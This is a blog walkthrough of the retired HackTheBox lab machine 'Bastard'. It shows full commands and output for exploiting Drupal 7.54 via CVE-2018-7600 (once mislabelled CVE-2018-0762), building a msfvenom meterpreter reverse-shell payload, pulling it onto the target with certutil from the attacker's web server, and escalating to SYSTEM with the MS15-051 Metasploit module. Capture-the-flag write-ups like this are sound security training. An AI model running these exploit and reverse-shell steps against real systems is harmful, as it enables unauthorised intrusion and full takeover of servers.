---
layout: post
title: Hackthebox Bastard Walkthrough
categories: HackTheBox
---

![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-01-11/bastard-badge.png)
#### Retired date: 2017/09/17

# Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of a box "Bastard".<br>

# Solution
### 1. Initial Enumeration

#### TCP Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.9 -sC -sV
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-10 17:29 EET
Nmap scan report for 10.10.10.9
Host is up (0.044s latency).
Not shown: 65532 filtered ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods:
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 169.57 seconds

root@kali:~#
{% endhighlight %}


### 2. Getting User

By accessing the web server, we can find the website that Drupal CMS is running.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-01-11/2020-01-11-01-36-38.png)

At first, try to figure out its version, we can see the file "CHANGELOG.txt".<br>
The version is "Drupal 7.54"
{% highlight shell %}
root@kali:~# curl -s http://10.10.10.9/CHANGELOG.txt | head

Drupal 7.54, 2017-02-01
-----------------------
- Modules are now able to define theme engines (API addition:
  https://www.drupal.org/node/2826480).
- Logging of searches can now be disabled (new option in the administrative
  interface).
- Added menu tree render structure to (pre-)process hooks for theme_menu_tree()
  (API addition: https://www.drupal.org/node/2827134).
- Added new function for determining whether an HTTPS request is being served

root@kali:~# 
{% endhighlight %}

Since we found the version of Drupal, take a look at public exploit.
{% highlight shell %}
root@kali:~# searchsploit drupal 7
------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                               |  Path
                                                                                                             | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------- ----------------------------------------
Drupal 4.7 - 'Attachment mod_mime' Remote Command Execution                                                  | exploits/php/webapps/1821.php
Drupal 4.x - URL-Encoded Input HTML Injection                                                                | exploits/php/webapps/27020.txt
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)                                            | exploits/php/webapps/34992.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)                                             | exploits/php/webapps/44355.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1)                                  | exploits/php/webapps/34984.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2)                                  | exploits/php/webapps/34993.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)                                     | exploits/php/webapps/35150.php
Drupal 7.12 - Multiple Vulnerabilities                                                                       | exploits/php/webapps/18564.txt
Drupal 7.x Module Services - Remote Code Execution                                                           | exploits/php/webapps/41564.php
Drupal < 4.7.6 - Post Comments Remote Command Execution                                                      | exploits/php/webapps/3313.pl
Drupal < 5.22/6.16 - Multiple Vulnerabilities                                                                | exploits/php/webapps/33706.txt
Drupal < 7.34 - Denial of Service                                                                            | exploits/php/dos/35415.txt
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                     | exploits/php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                  | exploits/php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                          | exploits/php/webapps/44449.rb
Drupal Module CKEditor < 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross-Site Scripting                       | exploits/php/webapps/25493.txt
Drupal Module Coder < 7.x-1.3/7.x-2.6 - Remote Code Execution                                                | exploits/php/remote/40144.php
Drupal Module Cumulus 5.x-1.1/6.x-1.4 - 'tagcloud' Cross-Site Scripting                                      | exploits/php/webapps/35397.txt
Drupal Module Drag & Drop Gallery 6.x-1.5 - 'upload.php' Arbitrary File Upload                               | exploits/php/webapps/37453.php
Drupal Module Embedded Media Field/Media 6.x : Video Flotsam/Media: Audio Flotsam - Multiple Vulnerabilities | exploits/php/webapps/35072.txt
Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit)                                            | exploits/php/remote/40130.rb
Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure                                            | exploits/php/webapps/44501.txt
------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result

root@kali:~# 
{% endhighlight %}

By googling the following keyword, we can find the exploit for <a href="https://github.com/pimps/CVE-2018-7600">"CVE-2018-0762"</a>.<br>
At first, we have to install the prerequisites.
{% highlight shell %}
root@kali:~# pip install requests

---

root@kali:~# pip install bs4

---
{% endhighlight %}

Then, execute the python script like following.<br>
We got RCE and the username is "iusr"
{% highlight shell %}
root@kali:~/CVE-2018-7600# python drupa7-CVE-2018-7600.py -c "whoami" http://10.10.10.9
()
=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-zOmyPneEf5iyoz3yKt8zu5m59kxdtrcNPWZ1eaYNM7s
[*] Triggering exploit to execute: whoami
nt authority\iusr

root@kali:~/CVE-2018-7600# 
{% endhighlight %}

Next, to obtain a reverse shell, generate a payload with msfvenom.
{% highlight shell %}
root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.36 LPORT=1338 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
root@kali:~#
{% endhighlight %}

To upload the payload "shell.exe", run a  web server on the localhost.
{% highlight shell %}
root@kali:~# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...


{% endhighlight %}

Next, let the server download our "shell.exe" with the following way.
{% highlight shell %}
root@kali:~/CVE-2018-7600# python drupa7-CVE-2018-7600.py -c "certutil.exe -urlcache -split -f http://10.10.14.36:8000/shell.exe shell.exe" http://10.10.10.9
()
=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-eluco1rRs3Likgl6whfexWXJUfBv18WMnuEcvVUc-hw
[*] Triggering exploit to execute: certutil.exe -urlcache -split -f http://10.10.14.36:8000/shell.exe shell.exe
****  Online  ****
  0000  ...
  1c00
CertUtil: -URLCache command completed successfully.

root@kali:~/CVE-2018-7600#
{% endhighlight %}

After that, set a handler for the meterpreter shell.
{% highlight shell %}
msf5 > use exploit/multi/handler

msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp

msf5 exploit(multi/handler) > set lhost 10.10.14.36
lhost => 10.10.14.36

msf5 exploit(multi/handler) > set lport 1338
lport => 1338

msf5 exploit(multi/handler) > run
{% endhighlight %}

Finally, run the following command to execute the remote "shell.exe"
{% highlight shell %}
root@kali:~/CVE-2018-7600# python drupa7-CVE-2018-7600.py -c "shell.exe" http://10.10.10.9
()
=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-3CDbNQWCSlC7U8JT4zNX52Lhbp3Kyc3txDmOtm_2Cxk
[*] Triggering exploit to execute: shell.exe

{% endhighlight %}

Now we got a reverse shell as a user "authority\isur".
{% highlight shell %}
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.36:1338 
[*] Sending stage (206403 bytes) to 10.10.10.9
[*] Meterpreter session 1 opened (10.10.14.36:1338 -> 10.10.10.9:49242) at 2020-01-11 00:39:37 +0200

meterpreter > getuid
Server username: NT AUTHORITY\IUSR
meterpreter >
{% endhighlight %}

"user.txt" is in the directory "C:\Users\dimitris\Desktop".
{% highlight shell %}
meterpreter > pwd
C:\users\dimitris\desktop

meterpreter > cat ./user.txt
ba22fde1932d06eb76a163d312f921a2

meterpreter >
{% endhighlight %}


### 3. Getting Root

By running "systeminfo", we can figure out that this server is Windows Server 2008 without any hotfix.<br>
This means that this OS is fresh install and no update was given.
{% highlight shell %}
C:\Users\Administrator\Desktop>systeminfo
systeminfo
Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00496-001-0001283-84782
Original Install Date:     18/3/2017, 7:04:46 ��
System Boot Time:          11/1/2020, 1:15:17 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.047 MB
Available Physical Memory: 1.565 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.578 MB
Virtual Memory: In Use:    517 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.9
C:\Users\Administrator\Desktop>
{% endhighlight %}

This time, "MS15-051" was used to get a SYSTEM shell.
{% highlight shell %}
msf5 exploit(multi/handler) > use exploit/windows/local/ms15_051_client_copy_image 

msf5 exploit(windows/local/ms15_051_client_copy_image) > set session 1
session => 1

msf5 exploit(windows/local/ms15_051_client_copy_image) > set target 1
target => 1

msf5 exploit(windows/local/ms15_051_client_copy_image) > set lhost 10.10.14.36
lhost => 10.10.14.36

msf5 exploit(windows/local/ms15_051_client_copy_image) > run

[*] Started reverse TCP handler on 10.10.14.36:4444 
[*] Launching notepad to host the exploit...
[+] Process 2052 launched.
[*] Reflectively injecting the exploit DLL into 2052...
[*] Injecting exploit into 2052...
[*] Exploit injected. Injecting payload into 2052...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Command shell session 2 opened (10.10.14.36:4444 -> 10.10.10.9:49182) at 2020-01-11 01:17:57 +0200

whoami
whoami
nt authority\system

C:\inetpub\drupal-7.54>
{% endhighlight %}

root.txt is in the directory "C:\Users\Administrator\Desktop".
{% highlight shell %}
C:\Users\Administrator\Desktop>type root.txt.txt
type root.txt.txt
4bf12b963da1b30cc93496f617f7ba7c

C:\Users\Administrator\Desktop>
{% endhighlight %}
